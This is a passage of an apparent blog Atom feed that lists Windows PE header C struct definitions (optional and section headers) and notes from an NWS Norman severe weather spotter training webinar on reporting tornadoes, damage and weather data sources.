+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_IMAGE_OPTIONAL_HEADER64&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;WORD&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;Magic&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;BYTE&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;MajorLinkerVersion&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;BYTE&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;MinorLinkerVersion&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;SizeOfCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;SizeOfInitializedData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;SizeOfUninitializedData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;AddressOfEntryPoint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;BaseOfCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;ULONGLONG&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;ImageBase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;SectionAlignment&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;FileAlignment&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;WORD&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;MajorOperatingSystemVersion&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;WORD&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;MinorOperatingSystemVersion&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;WORD&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;MajorImageVersion&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;WORD&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;MinorImageVersion&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;WORD&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;MajorSubsystemVersion&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;WORD&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;MinorSubsystemVersion&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;Win32VersionValue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;SizeOfImage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;SizeOfHeaders&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;CheckSum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;WORD&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;Subsystem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;WORD&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;DllCharacteristics&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;ULONGLONG&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;SizeOfStackReserve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;ULONGLONG&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;SizeOfStackCommit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;ULONGLONG&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;SizeOfHeapReserve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;ULONGLONG&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;SizeOfHeapCommit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;LoaderFlags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;NumberOfRvaAndSizes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;IMAGE_DATA_DIRECTORY&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DataDirectory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IMAGE_NUMBEROF_DIRECTORY_ENTRIES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IMAGE_OPTIONAL_HEADER64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PIMAGE_OPTIONAL_HEADER64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h5 id=&quot;32-bit&quot;&gt;32 Bit&lt;/h5&gt;
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_IMAGE_OPTIONAL_HEADER&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;//
+&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;// Standard fields.
+&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;//
+&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;WORD&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;Magic&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;BYTE&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;MajorLinkerVersion&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;BYTE&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;MinorLinkerVersion&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;SizeOfCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;SizeOfInitializedData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;SizeOfUninitializedData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;AddressOfEntryPoint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;BaseOfCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;BaseOfData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+    &lt;span class=&quot;c1&quot;&gt;//
+&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;// NT additional fields.
+&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;//
+&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;ImageBase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;SectionAlignment&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;FileAlignment&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;WORD&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;MajorOperatingSystemVersion&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;WORD&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;MinorOperatingSystemVersion&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;WORD&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;MajorImageVersion&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;WORD&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;MinorImageVersion&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;WORD&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;MajorSubsystemVersion&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;WORD&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;MinorSubsystemVersion&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;Win32VersionValue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;SizeOfImage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;SizeOfHeaders&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;CheckSum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;WORD&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;Subsystem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;WORD&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;DllCharacteristics&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;SizeOfStackReserve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;SizeOfStackCommit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;SizeOfHeapReserve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;SizeOfHeapCommit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;LoaderFlags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;NumberOfRvaAndSizes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;IMAGE_DATA_DIRECTORY&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DataDirectory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IMAGE_NUMBEROF_DIRECTORY_ENTRIES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IMAGE_OPTIONAL_HEADER32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PIMAGE_OPTIONAL_HEADER32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h5 id=&quot;section-header-struct&quot;&gt;Section Header Struct&lt;/h5&gt;
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_IMAGE_SECTION_HEADER&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;BYTE&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;Name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IMAGE_SIZEOF_SHORT_NAME&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;union&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;PhysicalAddress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;VirtualSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Misc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;VirtualAddress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;SizeOfRawData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;PointerToRawData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;PointerToRelocations&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;PointerToLinenumbers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;WORD&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;NumberOfRelocations&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;WORD&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;NumberOfLinenumbers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;Characteristics&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IMAGE_SECTION_HEADER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PIMAGE_SECTION_HEADER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Josh Finley</name></author><summary type="html">struct DOS_Header { // short is 2 bytes, long is 4 bytes char signature[2] = { 'M', 'Z' }; short lastsize; short nblocks; short nreloc; short hdrsize; short minalloc; short maxalloc; void *ss; // 2 byte value void *sp; // 2 byte value short checksum; void *ip; // 2 byte value void *cs; // 2 byte value short relocpos; short noverlay; short reserved1[4]; short oem_id; short oem_info; short reserved2[10]; long e_lfanew; // Offset to the 'PE\0\0' signature relative to the beginning of the file } Optional Header (misnomer - not actually optional) 64 Bit typedef struct _IMAGE_OPTIONAL_HEADER64 { WORD Magic; BYTE MajorLinkerVersion; BYTE MinorLinkerVersion; DWORD SizeOfCode; DWORD SizeOfInitializedData; DWORD SizeOfUninitializedData; DWORD AddressOfEntryPoint; DWORD BaseOfCode; ULONGLONG ImageBase; DWORD SectionAlignment; DWORD FileAlignment; WORD MajorOperatingSystemVersion; WORD MinorOperatingSystemVersion; WORD MajorImageVersion; WORD MinorImageVersion; WORD MajorSubsystemVersion; WORD MinorSubsystemVersion; DWORD Win32VersionValue; DWORD SizeOfImage; DWORD SizeOfHeaders; DWORD CheckSum; WORD Subsystem; WORD DllCharacteristics; ULONGLONG SizeOfStackReserve; ULONGLONG SizeOfStackCommit; ULONGLONG SizeOfHeapReserve; ULONGLONG SizeOfHeapCommit; DWORD LoaderFlags; DWORD NumberOfRvaAndSizes; IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; } IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64;</summary></entry><entry><title type="html">NWS Norman - Severe Weather Spotter Training Notes Session 2</title><link href="http://localhost:4000/spotter-training-2/" rel="alternate" type="text/html" title="NWS Norman - Severe Weather Spotter Training Notes Session 2" /><published>2020-03-30T00:06:30-05:00</published><updated>2020-03-30T00:06:30-05:00</updated><id>http://localhost:4000/spotter-training-2</id><content type="html" xml:base="http://localhost:4000/spotter-training-2/">&lt;p&gt;Notes on Advanced Severe Weather Spotter Training webinar #skywarn.&lt;/p&gt;
+
+&lt;h2 id=&quot;on-the-agenda&quot;&gt;On the Agenda&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;ol&gt;
+      &lt;li&gt;Reporting refresher&lt;/li&gt;
+    &lt;/ol&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;ol&gt;
+      &lt;li&gt;Severe weather meteorology&lt;/li&gt;
+    &lt;/ol&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;ol&gt;
+      &lt;li&gt;Storm structure and evolution (deep dive)&lt;/li&gt;
+    &lt;/ol&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;At the NWS office:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;They know theres a storm&lt;/li&gt;
+  &lt;li&gt;They think theres severe weather&lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;They need groundobservations to verify&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;They need a prepoderance of evidence
+    &lt;ul&gt;
+      &lt;li&gt;Mainly radar data and spotter reports&lt;/li&gt;
+      &lt;li&gt;Conceptual models&lt;/li&gt;
+      &lt;li&gt;Storm history&lt;/li&gt;
+      &lt;li&gt;Forecaster intuition&lt;/li&gt;
+      &lt;li&gt;Forecaster experience&lt;/li&gt;
+      &lt;li&gt;Potential storm impacts&lt;/li&gt;
+      &lt;li&gt;Potential warning impacts&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Deciding on a type of warning:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;spotters are very important for this component&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;NWS Warnings&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Paradigm:
+    &lt;ul&gt;
+      &lt;li&gt;Severe Thunderstorm worning
+        &lt;ul&gt;
+          &lt;li&gt;elevated wording&lt;/li&gt;
+          &lt;li&gt;tornado possible
+  tornado&lt;/li&gt;
+          &lt;li&gt;radar&lt;/li&gt;
+          &lt;li&gt;observed&lt;/li&gt;
+          &lt;li&gt;considerable&lt;/li&gt;
+          &lt;li&gt;catastrophic&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;Spotter reports drive the message&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;reporting-refresher&quot;&gt;Reporting refresher&lt;/h2&gt;
+
+&lt;h3 id=&quot;what-makes-a-good-report&quot;&gt;What makes a good report?&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;Timely&lt;/li&gt;
+  &lt;li&gt;Concise&lt;/li&gt;
+  &lt;li&gt;Calm&lt;/li&gt;
+  &lt;li&gt;Clear&lt;/li&gt;
+  &lt;li&gt;Accurate&lt;/li&gt;
+  &lt;li&gt;Objective&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;components&quot;&gt;Components&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;who are you
+    &lt;ul&gt;
+      &lt;li&gt;name&lt;/li&gt;
+      &lt;li&gt;im a trained spotter in NWS norman&lt;/li&gt;
+      &lt;li&gt;if with spotter group&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;where are you&lt;/li&gt;
+  &lt;li&gt;what do you see&lt;/li&gt;
+  &lt;li&gt;where did you see it&lt;/li&gt;
+  &lt;li&gt;when did it happen&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;where-to-report&quot;&gt;Where to report&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;405-325-3816&lt;/li&gt;
+  &lt;li&gt;spotternetwork.org&lt;/li&gt;
+  &lt;li&gt;amateur radio: WX5OUN&lt;/li&gt;
+  &lt;li&gt;twitter: @NWSNorman/@NWSTulsa&lt;/li&gt;
+  &lt;li&gt;mPING: mping.nssl.noaa.gov&lt;/li&gt;
+  &lt;li&gt;after the fact: sr-oun.spotter@noaa.gov&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;if-reporting-a-tornado&quot;&gt;If reporting a tornado&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;distinguish between tornado, funnel cloud, wall cloud&lt;/li&gt;
+  &lt;li&gt;are you sure its a tornado?&lt;/li&gt;
+  &lt;li&gt;if you can see ground or cloud base under it, consider funnel cloud or wall cloud&lt;/li&gt;
+  &lt;li&gt;is it connected to the cloud base&lt;/li&gt;
+  &lt;li&gt;is it in contact with ground&lt;/li&gt;
+  &lt;li&gt;is it in the part of the storm where tornadoes develop
+    &lt;ul&gt;
+      &lt;li&gt;distinct from gustnados and landspouts&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;is it rotating
+    &lt;ul&gt;
+      &lt;li&gt;or just a big downdraft&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;can you see any debris&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;describing-a-tornado&quot;&gt;Describing a tornado&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;report exactly what you see&lt;/li&gt;
+  &lt;li&gt;choose words wisely&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;severe-thunderstorm-definition&quot;&gt;Severe Thunderstorm Definition&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;1”+ hail &amp;amp; 58mph wind and tornado&lt;/li&gt;
+  &lt;li&gt;wind damage and hail damage very useful in reports&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;wind-damage&quot;&gt;Wind Damage&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;underrated, but important to report&lt;/li&gt;
+  &lt;li&gt;related to outbuildings, trees, powerlines, etc.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;reporting-damage&quot;&gt;Reporting Damage&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;Location&lt;/li&gt;
+  &lt;li&gt;Time it happened (if known)&lt;/li&gt;
+  &lt;li&gt;Description/images/video&lt;/li&gt;
+  &lt;li&gt;If not sure what caused it, dont assume it was a tornado&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;power-flashes&quot;&gt;Power Flashes&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;Arc from shorted out powerline&lt;/li&gt;
+  &lt;li&gt;Wind causing lines to touch&lt;/li&gt;
+  &lt;li&gt;Object resting across live wires&lt;/li&gt;
+  &lt;li&gt;Report power flashes&lt;/li&gt;
+  &lt;li&gt;Dont assume that a power flash means a tornado&lt;/li&gt;
+  &lt;li&gt;Can help confirm tornado if other clues are present&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;in-general&quot;&gt;In General&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;pictures are very useful&lt;/li&gt;
+  &lt;li&gt;www.spc.noaa.gov/exper/spcousom is the next step after this video&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;2-severe-weather-meteorology&quot;&gt;2. Severe Weather Meteorology&lt;/h2&gt;
+&lt;p&gt;Mostly mesoscale scale features rather than storm scale&lt;/p&gt;
+
+&lt;p&gt;Where to monitor data:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;www.spc.noaa.gov
+    &lt;ul&gt;
+      &lt;li&gt;Forecast tools page
+        &lt;ul&gt;
+          &lt;li&gt;Upper air maps&lt;/li&gt;
+          &lt;li&gt;Skew-T charts&lt;/li&gt;
+          &lt;li&gt;Mesoanalysis maps with derived severe weather parameters&lt;/li&gt;
